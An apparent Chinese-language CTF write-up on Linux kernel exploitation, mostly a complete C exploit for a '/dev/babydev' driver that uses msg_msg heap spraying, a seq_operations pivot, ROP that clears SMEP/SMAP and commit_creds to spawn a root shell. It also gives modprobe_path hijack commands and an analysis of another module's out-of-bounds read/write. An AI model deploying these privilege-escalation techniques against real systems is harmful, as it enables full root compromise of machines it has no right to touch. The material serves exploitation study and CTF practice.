
```text
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99  100  101  102  103  104  105  106  107  108  109  110  111  112  113  114  115  116  117  118  119  120  121  122  123  124  125  126  127  128  129  130  131  132  133  134  135  136  137  138  139  140  141  142  143  144  145  146  147  148  149  150  151  152  153  154  155  156  157  158  159  160  161  162  163  164  165  166  167  168  169  170  171  172  173  174  175  176  177  178  179  180  181 | `#define _GNU_SOURCE`  `#include <unistd.h>`  `#include <stdio.h>`  `#include <stdlib.h>`  `#include <stdint.h>`  `#include <string.h>`  `#include <fcntl.h>`  `#include <sys/stat.h>`  `#include <sys/types.h>`  `#include <sys/ioctl.h>`  `#include <linux/keyctl.h>`    `#include <sys/shm.h>`  `#include <sys/msg.h>`  `#include <sys/ipc.h>`  `#include <sys/syscall.h>`    `#include <errno.h>`    `int` `dev_fd[``2``], seq_fd;`  `const char` `*``dev_name` `=` `"/dev/babydev"``;`    `size_t commit_creds` `=` `0xffffffff810a1420``;`  `size_t prepare_kernel_cred` `=` `0xffffffff810a1810``;`  `size_t rop_addr;`    `size_t usr_cs, usr_rflags, usr_rsp, usr_ss;`  `void save_status()`  `{`  `__asm__(`  `"mov usr_cs, cs;"`  `"pushf;"`  `"pop usr_rflags;"`  `"mov usr_rsp, rsp;"`  `"mov usr_ss, ss;"`  `);`  `}`    `void get_root()`  `{`  `char``*` `(``*``pkc)(``int``)` `=` `prepare_kernel_cred;`  `void``*` `(``*``cc)(char``*``)` `=` `commit_creds;`  `(``*``cc)((``*``pkc)(``0``));`  `}`    `void get_root_shell()`  `{`  `if` `(getuid()!``=``0``) {`  `puts(``"[-] get root failed."``);`  `exit(``-``1``);`  `}`  `system(``"/bin/sh"``);`  `}`    `void build_rop(size_t` `*``rop,` `int` `offset)`  `{`  `int` `i` `=` `offset;`  `rop[i``+``+``]` `=` `0xffffffff810d238d``;` `/``/` `pop rdi; ret;`  `rop[i``+``+``]` `=` `0x6f0``;` `/``/` `bypass smep&smap`  `rop[i``+``+``]` `=` `0xffffffff81004d80``;` `/``/` `mov cr4, rdi; pop rbp; ret;`  `rop[i``+``+``]` `=` `0``;`  `rop[i``+``+``]` `=` `(size_t)get_root;` `/``/` `ret2usr`  `rop[i``+``+``]` `=` `0xffffffff81063694``;` `/``/` `swapgs; pop rbp; ret;`  `rop[i``+``+``]` `=` `((size_t)&i);`  `rop[i``+``+``]` `=` `0xffffffff814e35ef``;` `/``/` `iretq; ret;`  `rop[i``+``+``]` `=` `(size_t)get_root_shell;` `/``/` `rip`  `rop[i``+``+``]` `=` `usr_cs;`  `rop[i``+``+``]` `=` `usr_rflags;`  `rop[i``+``+``]` `=` `usr_rsp;`  `rop[i``+``+``]` `=` `usr_ss;`  `}`    `int` `getMsgQueue(void)`  `{`  `return` `msgget(IPC_PRIVATE,` `0666` `| IPC_CREAT);`  `}`    `int` `readMsg(``int` `msqid, void` `*``msgp, size_t msgsz,` `long` `msgtyp)`  `{`  `return` `msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT|MSG_NOERROR);`  `}`    `int` `writeMsg(``int` `msqid, void` `*``msgp, size_t msgsz)`  `{`  `return` `msgsnd(msqid, msgp, msgsz,` `0``);`  `}`    `int` `main()`  `{`  `save_status();`  `signal(``11``, (size_t)get_root_shell);`    `int` `qid` `=` `getMsgQueue();`  `if` `(qid` `=``=` `-``1``) {`  `fprintf(stderr,` `"[-] msg_queue\n"``);`  `exit(``-``1``);`  `}`    `dev_fd[``0``]` `=` `open``(dev_name, O_RDWR);`  `if` `(dev_fd[``0``]` `=``=` `-``1``) {`  `fprintf(stderr,` `"[-] open %s failed.(1)\n"``, dev_name);`  `exit(``-``1``);`  `}`    `dev_fd[``1``]` `=` `open``(dev_name, O_RDWR);`  `if` `(dev_fd[``1``]` `=``=` `-``1``) {`  `fprintf(stderr,` `"[-] open %s failed.(2)\n"``, dev_name);`  `exit(``-``1``);`  `}`    `char` `*``buffer_send` `=` `malloc(``0x4000``);`  `char` `*``buffer_recv` `=` `malloc(``0x4000``);`  `memset(buffer_send,` `0x61``,` `0x4000``);`    `build_rop((size_t` `*``)buffer_send, ((``0x1000``-``0x30``)>>``3``)``+``1``);`    `ioctl(dev_fd[``0``],` `0x10001``,` `0x1000``);`  `close(dev_fd[``0``]);`    `int` `cnt` `=` `1``;`  `for` `(``int` `i` `=` `0``; i < cnt;`  `+``+``i) {`  `if` `(writeMsg(qid, buffer_send,` `0x1100``-``0x38``) <` `0``)`  `fprintf(stderr,` `"[-] msg_msg\n"``);`  `else`  `puts(``"[+] msg_msg\n"``);`  `}`      `read(dev_fd[``1``], buffer_recv,` `0x40``);`  `puts(``"\nPartial leak:"``);`  `for` `(``int` `i` `=` `0``; i <` `8``; ) {`  `printf(``"[+] %016lx %016lx\n"``, ((size_t` `*``)buffer_recv)[i], ((size_t` `*``)buffer_recv)[i``+``1``]);`  `i` `+``=` `2``;`  `}`  `rop_addr` `=` `((size_t` `*``)buffer_recv)[``4``]` `+` `0x8``;`  `printf(``"[+] rop_addr: 0x%lx\n"``, rop_addr);`  `printf(``"[+] buffer_send: 0x%lx\n"``, buffer_send);`    `dev_fd[``0``]` `=` `open``(dev_name, O_RDWR);`  `if` `(dev_fd[``0``]` `=``=` `-``1``) {`  `fprintf(stderr,` `"[-] open %s failed.(3)\n"``, dev_name);`  `exit(``-``1``);`  `}`  `ioctl(dev_fd[``0``],` `0x10001``,` `0x18``);`  `close(dev_fd[``0``]);`    `seq_fd` `=` `open``(``"/proc/self/stat"``, O_RDONLY);`  `if` `(seq_fd` `=``=` `-``1``) {`  `puts(``"[-] failed in opening seq_fd."``);`  `exit(``-``1``);`  `}`    `/``/` `getchar();`    `size_t ptr` `=` `0xffffffff8151a3a5``;` `/``/` `add rsp,` `0x148``; pop rbx; pop r12; pop r13; pop rbp; ret;`  `write(dev_fd[``1``], (char` `*``)&ptr,` `0x8``);`    `__asm__(`  `"mov r15,   0xffffffff8100006f;"`  `/``/` `ret;`  `"mov r14,   0xffffffff81183478;"`  `/``/` `add rsp,` `0x40``; pop rbx; pop rbp; ret;`  `"mov r13,   0xffffffff8100006f;"`  `"mov r12,   0xffffffff8100006f;"`  `"mov rbp,   0xffffffff8100006f;"`  `"mov rbx,   0xffffffff8100006f;"`  `"mov r11,   0xffffffff8100006f;"`  `"mov r10,   0xffffffff8100006f;"`  `"mov r9,    0xffffffff81171045;"`  `/``/` `pop rsp; ret;`  `"mov r8,    rop_addr;"`  `"xor rax,   rax;"`  `"xor rdi,   rdi;"`  `"mov rcx,   0xdeadbeef;"`  `"mov rdx,   8;"`  `"mov rsi,   rsp;"`  `"mov rdi,   seq_fd;"`  `"syscall"`               `/``/` `read(seq_fd, $rsp,` `8``);`  `);`    `/``/` `getchar();`    `return` `0``;`  `}` |
```

![](https://bbs.kanxue.com/upload/attach/202303/951122_BTXTENNPV8G4CYW.png)

## Hijack modprobe_path

他和 `poweroff_cmd`, `uevent_helper`, `ocfs2_hb_ctl_path`, `nfs_cache_getent_prog`, `cltrack_prog` 这些变量类似，都是 `call_usermodehelper` 类型的 trick。

只需要劫持一个字符串，就能用 root 权限执行任意命令（但是这个命令往往是不可以交互的）

以 `modprobe_path` 为例在劫持了对应字符串为 `/tmp/a.sh` 之后，只需要运行一个非正确的 ELF 文件即可触发

```text
|  |  |
| --- | --- |
| 1  2  3  4  5 | `system(``"echo -ne '\\xff\\xff\\xff\\xff' >> /tmp/dummy"``);`  `system(``"echo '#!/bin/sh\nchmod 777 /flag' >> /tmp/a.sh"``);`  `system(``"chmod 777 /tmp/dummy; chmod 777 /tmp/a.sh"``);`    `system(``"/tmp/dummy"``);` |
```

### rwOnTheHeap

#### 分析

`checksec` 只开了 NX

关键函数如下，

```text
|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29 | `__int64 procfile_open()`  `{`  `_QWORD` `*``v0;` `/``/` `rax`    `_fentry__();`  `v0` `=` `(_QWORD` `*``)kmem_cache_alloc_trace(kmalloc_caches[``10``],` `3264LL``,` `1024LL``);`  `*``v0` `=` `v0;`  `procfs_buffer` `=` `(__int64)v0;`  `return` `_x86_return_thunk(``0LL``,` `0LL``,` `0LL``);`  `}`    `__int64 __fastcall procfile_write(__int64 a1, __int64 a2)`  `{`  `_fentry__();`  `if` `( !copy_from_user(&request_t, a2,` `16LL``) )`  `*``(_QWORD` `*``)(procfs_buffer` `+` `*``(&request_t` `+` `1``))` `=` `request_t;`  `return` `_x86_return_thunk(``0LL``,` `0LL``,` `0LL``);`  `}`    `__int64 __fastcall procfile_read(__int64 a1, __int64 a2)`  `{`  `_fentry__();`  `if` `( !copy_from_user(&request_t, a2,` `16LL``) )`  `{`  `request_t` `=` `*``(_QWORD` `*``)(procfs_buffer` `+` `*``(&request_t` `+` `1``));`  `copy_to_user(a2, &request_t,` `16LL``);`  `}`  `return` `_x86_return_thunk(``0LL``,` `0LL``,` `0LL``);`  `}` |
```

非常直观的 dma 中越界读写漏洞（值得一提的是，越界的地址范围多达 8 字节，这已经可以任意位置读写了）

不难想到，只需要 leak 出 kernel 的 text 段地址即可直接越界修改 `modprobe_path` 达成利用。

在 leak 的时候我使用的方法是

- 构造若干个 `msg_msg` 和 `msg_msgseg`，在一个 `msg_queue` 上挂着 0x400 的 `msg_msg`，指向 0x1000 的 `msg_msg`，再指向 0x20 的 `msg_msgseg`。然后再开一个 `shm_file_data`（0x20）。
